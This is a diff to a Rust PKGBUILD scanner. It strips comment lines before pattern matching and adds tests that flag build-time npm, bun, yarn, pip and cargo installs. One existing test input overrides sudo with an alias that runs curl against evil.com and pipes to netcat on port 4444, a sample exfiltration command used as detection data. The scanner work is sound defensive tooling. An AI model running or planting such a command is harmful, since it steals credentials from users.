@@ -8,15 +8,16 @@ pub struct PkgbuildAnalysis;
 
 impl Feature for PkgbuildAnalysis {
     fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
-        let Some(ref content) = ctx.pkgbuild_content else {
+        let Some(ref raw) = ctx.pkgbuild_content else {
             return Vec::new();
         };
+        let content = crate::shared::text::strip_comment_lines(raw);
 
         let compiled = patterns::compiled_patterns();
         let mut signals = Vec::new();
 
         for pat in compiled {
-            if pat.regex.is_match(content) {
+            if pat.regex.is_match(&content) {
                 let matched_line = content
                     .lines()
                     .find(|line| pat.regex.is_match(line))
@@ -632,6 +633,56 @@ mod tests {
     fn alias_override() {
         let ids = analyze("alias sudo='curl http://evil.com/creds | nc 10.0.0.1 4444; sudo'");
         assert!(has(&ids, "P-ALIAS-OVERRIDE"));
+    }
+
+    // --- Build-time package-manager installs ---
+
+    #[test]
+    fn build_net_install_npm() {
+        let ids = analyze("npm install atomic-lockfile minimist chalk");
+        assert!(has(&ids, "P-NET-PKG-INSTALL-JS"));
+    }
+
+    #[test]
+    fn build_net_install_bun() {
+        let ids = analyze("bun install js-digest");
+        assert!(has(&ids, "P-NET-PKG-INSTALL-JS"));
+    }
+
+    #[test]
+    fn build_net_install_yarn_add() {
+        let ids = analyze("yarn add left-pad");
+        assert!(has(&ids, "P-NET-PKG-INSTALL-JS"));
+    }
+
+    #[test]
+    fn build_pip_install() {
+        let ids = analyze("pip install requests");
+        assert!(has(&ids, "P-NET-PKG-INSTALL"));
+    }
+
+    #[test]
+    fn build_cargo_install() {
+        let ids = analyze("cargo install ripgrep");
+        assert!(has(&ids, "P-NET-PKG-INSTALL"));
+    }
+
+    #[test]
+    fn bare_npm_install_no_signal() {
+        let ids = analyze("npm install");
+        assert!(!has(&ids, "P-NET-PKG-INSTALL-JS"), "bare npm install should not fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn npm_ci_no_signal() {
+        let ids = analyze("npm ci");
+        assert!(!has(&ids, "P-NET-PKG-INSTALL-JS"), "npm ci should not fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn bun_install_bare_no_signal() {
+        let ids = analyze("bun install");
+        assert!(!has(&ids, "P-NET-PKG-INSTALL-JS"), "bare bun install should not fire, got: {ids:?}");
     }
 
     // --- False positive check ---
